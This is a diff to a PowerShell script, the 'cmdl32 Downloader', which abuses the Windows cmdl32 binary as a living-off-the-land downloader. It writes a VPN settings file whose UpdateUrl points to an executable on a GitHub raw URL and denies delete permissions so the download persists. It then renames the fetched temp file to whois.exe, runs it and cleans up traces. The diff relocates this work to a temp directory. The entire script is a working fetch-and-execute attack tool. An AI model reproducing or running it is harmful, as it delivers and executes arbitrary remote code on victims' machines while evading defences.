@@ -1,18 +1,21 @@
 Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
 # Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
 
-$PSScriptRoot = (Get-Location).Path
+# Create a temp directory to work in
+$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
+New-Item -Path $tempDir -ItemType Directory -Force
 
-# Change to the script's directory
-Set-Location -Path $PSScriptRoot
+# Change to the temp directory
+Set-Location -Path $tempDir
+Write-Host "[*] Working directory changed to $tempDir"
 
 Write-Host "[*] Denying delete permissions for current user"
-# Use the environment variable for the current username
-icacls $PSScriptRoot /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
+# Deny delete permissions in the temp directory for the current user
+icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
 
 Write-Host "[*] Setting temp environment variable"
-# Set the TMP environment variable to the current directory
-$env:TMP = (Get-Location).Path
+# Set the TMP environment variable to the temp directory
+$env:TMP = $tempDir
 
 Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
@@ -23,12 +26,12 @@ TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "settings.txt" -Value $settingsContent
+Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 
 Write-Host "[*] Performing download with cmdl32"
 # Assuming cmdl32 is in system32 or accessible
 $cmdl32Path = "cmdl32"
-$arguments = "/vpn /lan `"$PSScriptRoot\settings.txt`""
+$arguments = "/vpn /lan `"$tempDir\settings.txt`""
 
 try {
     Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
@@ -36,30 +39,30 @@ try {
 } catch {
     Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
     # Revert permissions before exiting
-    icacls $PSScriptRoot /remove:d "$env:USERNAME"
+    icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
 
 Write-Host "[*] Reverting permissions"
-icacls $PSScriptRoot /remove:d "$env:USERNAME"
+icacls $tempDir /remove:d "$env:USERNAME"
 
 Write-Host "[*] Renaming downloaded file for execution"
 # Rename the downloaded VPN file (if it follows the VPN*.tmp pattern)
-$downloadedFile = Get-ChildItem -Filter "VPN*.tmp" | Select-Object -First 1
+$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
 
 if ($downloadedFile) {
-    Rename-Item -Path $downloadedFile.FullName -NewName "whois.exe" -Force
+    Rename-Item -Path $downloadedFile.FullName -NewName "$tempDir\whois.exe" -Force
     Write-Host "[*] Renamed VPN*.tmp to whois.exe."
 } else {
     Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
     # Revert permissions before exiting
-    icacls $PSScriptRoot /remove:d "$env:USERNAME"
+    icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
 
 Write-Host "[*] Executing the downloaded file"
-if (Test-Path ".\whois.exe") {
-    Start-Process -FilePath ".\whois.exe" -NoNewWindow -Wait
+if (Test-Path "$tempDir\whois.exe") {
+    Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
     Write-Host "[*] Execution complete."
 } else {
     Write-Host "[!] whois.exe not found after renaming. Exiting script."
@@ -67,6 +70,10 @@ if (Test-Path ".\whois.exe") {
 }
 
 Write-Host "[*] Cleaning up downloaded file"
-Remove-Item -Path ".\whois.exe" -Force
-Remove-Item -Path ".\settings.txt" -Force
+Remove-Item -Path "$tempDir\whois.exe" -Force
+Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
+
+# Optionally, clean up the temp directory if you want
+Remove-Item -Path $tempDir -Recurse -Force
+Write-Host "[*] Temp directory removed."
